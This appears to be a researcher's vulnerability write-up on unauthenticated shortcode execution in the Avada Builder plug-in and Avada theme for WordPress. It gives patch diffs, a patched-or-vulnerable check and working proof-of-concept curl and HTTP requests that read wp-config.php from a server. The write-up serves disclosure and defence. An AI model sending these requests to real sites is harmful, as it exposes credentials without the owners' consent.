# CVE-2024-13345 - Avada Builder <= 3.11.13 - Unauthenticated Arbitrary Shortcode Execution

## TL;DR

> [!NOTE]
> Although CVE-2024-13345 and CVE-2024-13346 are separate vulnerabilities, affecting different components, they were fixed at the same time. Therefore, detecting one is likely to mean that the WordPress instance is vulnerable to the other as well.

Check if the WordPress instance is vulnerable to CVE-2024-13345.

```console
$ curl -H 'Content-Type: application/x-www-form-urlencoded' -d 'content=[fusion_alert]' -X POST 'http://127.0.0.1:8000/wp-json/awb/rendered_content'
{"code":"rest_forbidden","message":"Sorry, you are not allowed to do that.","data":{"status":401}}
```

If the server returns the above message, it means that the Avada Builder plug-in has been **patched**.

```console
$ curl -H 'Content-Type: application/x-www-form-urlencoded' -d 'content=[fusion_alert]' -X POST 'http://127.0.0.1:8000/wp-json/awb/rendered_content'
{"content":"<div class=\"fusion-alert alert general alert-info fusion-alert-center awb-alert-native-link-color alert-dismissable awb-alert-close-boxed\" role=\"alert\"><div class=\"fusion-alert-content-wrapper\"><span class=\"alert-icon\"><i class=\"awb-icon-info-circle\" aria-hidden=\"true\"><\/i><\/span><span class=\"fusion-alert-content\"><\/span><\/div><button type=\"button\" class=\"close toggle-alert\" data-dismiss=\"alert\" aria-label=\"Close\">&times;<\/button><\/div>\n"}
```

If the server interprets the shortcode, it means that the Avada Builder plug-in is **vulnerable**.

Below is a proof-of-concept request for reading the file `wp-config.php` on the remote server.

```console
$ curl -H 'Content-Type: application/x-www-form-urlencoded' -d 'content=[fusion_section_separator+divider_type="custom"+custom_svg="wp-config.php"]' -X POST 'http://127.0.0.1:8000/wp-json/awb/rendered_content'
{"content":"<div class=\"fusion-section-separator section-separator custom fusion-section-separator-1\" style=\"--awb-spacer-height:65px;--awb-bg-size:100% 100%;\"><div class=\"fusion-section-separator-svg\"><div class=\"fusion-custom-candy-sep fusion-section-separator-svg-bg\" style=\"background-image:url( data:image\/svg+xml;utf8,<URL_ENCODED_FILE_CONTENT> );height:65px;height:65px;background-size:cover;\"><\/div><\/div><div class=\"fusion-section-separator-spacer\"><div class=\"fusion-section-separator-spacer-height\"><\/div><\/div><\/div>\n"}
```

> [!IMPORTANT]  
> If the file does not exist, no error is returned. The SVG content is just empty.

## CVE-2024-13345 - Avada Builder <= 3.11.13

The vulnerability seems to be located in the file `plugins/fusion-builder/inc/class-fusion-builder.php`.

```diff
diff -bur fusion-builder-v3.11.6/inc/class-fusion-builder.php fusion-builder-v3.11.15/inc/class-fusion-builder.php
--- fusion-builder-v3.11.6/inc/class-fusion-builder.php    2024-02-27 17:05:53.000000000 +0100
+++ fusion-builder-v3.11.15/inc/class-fusion-builder.php    2025-03-18 17:27:30.000000000 +0100
@@ -7119,7 +7299,10 @@
        [
            'methods'             => 'POST',
            'callback'            => [ $this, 'rendered_content_endpoint' ],
-                'permission_callback' => '__return_true',
+                'permission_callback' => function () {
+                    return current_user_can( 'edit_others_posts' );
+                },
+
        ]
```

A permission check callback is now invoked when using the REST API endpoint `/rendered_content`. Prior to the patch, it just returned `true`, thus allowing unauthenticated users to invoke `rendered_content_endpoint()`, which then calls the built-in function `apply_filters()` (=> `do_shortcode()`) on the user-controlled input `content`.

```php
// /inc/class-fusion-builder.php
public function register_rendered_content_endpoint() {
    // User media.
    register_rest_route(
        'awb',
        '/rendered_content',
        [
            'methods'             => 'POST',
            'callback'            => [ $this, 'rendered_content_endpoint' ],
            'permission_callback' => '__return_true',
        ]
    );
}

public function rendered_content_endpoint( $data ) {
    $content = apply_filters( 'the_content', $data->get_param( 'content' ) );

    return [ 'content' => $content ];
}
```

Reaching the vulnerable code is as simple as sending the following HTTP request.

```http
POST /wp-json/awb/rendered_content HTTP/2
Host: 10.11.12.13
Content-Type: application/x-www-form-urlencoded
Content-Length: 22

content=[fusion_alert]
```

Shortcode execution is not interesting on its own though. A shortcode is just used to transform a "tag" (with optional parameters), such as `[fusion_alert]` here into dynamically generated HTML code. To do so, a custom handler must be defined for each shortcode. Therefore, it is interesting to check whether such a handler can be leveraged to achieve arbitrary code execution for instance.

Although I did not find such a handler, I did find one that would provide an arbitrary file read primitive.

In the file `plugins/fusion-builder/shortcodes/fusion-section-separator.php`, one can find a handler for the shortcode `[fusion_section_separator]`, which invokes `fusion_get_svg_from_file()` using a user-controlled file path, and returns the URL-encoded result to the client.

```php
// plugins/fusion-builder/shortcodes/fusion-section-separator.php
public function render( $args, $content = '' ) {
    // ...
    if ( 'triangle' === $this->args['divider_type'] ) {
        //...
    } elseif ( 'custom' === $this->args['divider_type'] && '' !== $this->args['custom_svg'] ) {

        $custom_svg_data                      = fusion_get_svg_from_file( $this->args['custom_svg'], [ 'background-color' => $this->args['backgroundcolor'] ] );
        $this->args['default_divider_height'] = ! empty( $custom_svg_data['height'] ) ? $custom_svg_data['height'] . 'px' : '65px';

        $this->args['svg_element'] = ! empty( $custom_svg_data['svg'] ) ? $custom_svg_data['svg'] : '';
        $candy                     = '<div ' . FusionBuilder::attributes( 'section-separator-shortcode-divider-svg-bg-image' ) . '></div>';

    }
    // ...
}
```

For instance, it is possible to retrieve the content of the file `wp-config.php` using the following HTTP request.

```http
POST /wp-json/awb/rendered_content HTTP/2
Host: 10.11.12.13
Content-Type: application/x-www-form-urlencoded
Content-Length: 83

content=[fusion_section_separator+divider_type="custom"+custom_svg="wp-config.php"]
```

## CVE-2024-13346 - Avada Theme <= 7.11.13

The vulnerability seems to be located in the file `includes/class-awb-google-recaptcha.php`.

```diff
diff -bur Avada_7.11.12/includes/class-awb-google-recaptcha.php Avada_7.11.14/includes/class-awb-google-recaptcha.php
--- Avada_7.11.12/includes/class-awb-google-recaptcha.php    2024-12-16 11:00:34.000000000 +0100
+++ Avada_7.11.14/includes/class-awb-google-recaptcha.php    2025-01-29 11:03:30.000000000 +0100
@@ -74,7 +74,7 @@
        $recaptcha_error = ( isset( $_GET['recaptcha_error'] ) && '' !== $_GET['recaptcha_error'] ) ? sanitize_text_field( wp_unslash( $_GET['recaptcha_error'] ) ) : '';  // phpcs:ignore WordPress.Security.NonceVerification
        $type            = ( isset( $_GET['type'] ) && '' !== $_GET['type'] ) ? sanitize_text_field( wp_unslash( $_GET['type'] ) ) : '';  // phpcs:ignore WordPress.Security.NonceVerification    
        if ( $recaptcha_error && $type ) {
-            echo do_shortcode( '[fusion_alert margin_top="20px" type="' . $type . '"]' . $recaptcha_error . '[/fusion_alert]' );
+            echo do_shortcode( '[fusion_alert margin_top="20px" type="' . esc_attr( strip_shortcodes( $type ) ) . '"]' . esc_html( strip_shortcodes( $recaptcha_error ) ) . '[/fusion_alert]' );
        }
```

In version 7.11.14 of the theme, the function `strip_shortcodes()` was added, before invoking `do_shortcode()` using the user-controlled input `type`.

Reaching the vulnerable code seems to require Captchas to be enabled in the theme's settings though, which is not the default.

## References

CVE-2024-13345 - Avada Builder <= 3.11.13 - Unauthenticated Arbitrary Shortcode Execution

- [https://nvd.nist.gov/vuln/detail/CVE-2024-13345](https://nvd.nist.gov/vuln/detail/CVE-2024-13345)
- [https://www.wordfence.com/threat-intel/vulnerabilities/wordpress-plugins/fusion-builder/avada-builder-31113-unauthenticated-arbitrary-shortcode-execution](https://www.wordfence.com/threat-intel/vulnerabilities/wordpress-plugins/fusion-builder/avada-builder-31113-unauthenticated-arbitrary-shortcode-execution)
- [https://avada.com/documentation/avada-changelog/](https://avada.com/documentation/avada-changelog/)
- Researcher: [@mikemyers](https://www.wordfence.com/threat-intel/vulnerabilities/researchers/michael-mazzolini)

CVE-2024-13346 - Avada Theme <= 7.11.13 - Unauthenticated Arbitrary Shortcode Execution

- [https://nvd.nist.gov/vuln/detail/CVE-2024-13346](https://nvd.nist.gov/vuln/detail/CVE-2024-13346)
- [https://www.wordfence.com/threat-intel/vulnerabilities/wordpress-themes/Avada/avada-theme-71113-unauthenticated-arbitrary-shortcode-execution](https://www.wordfence.com/threat-intel/vulnerabilities/wordpress-themes/Avada/avada-theme-71113-unauthenticated-arbitrary-shortcode-execution)
- [https://avada.com/documentation/avada-changelog/](https://avada.com/documentation/avada-changelog/)
- Researcher: [@mikemyers](https://www.wordfence.com/threat-intel/vulnerabilities/researchers/michael-mazzolini)
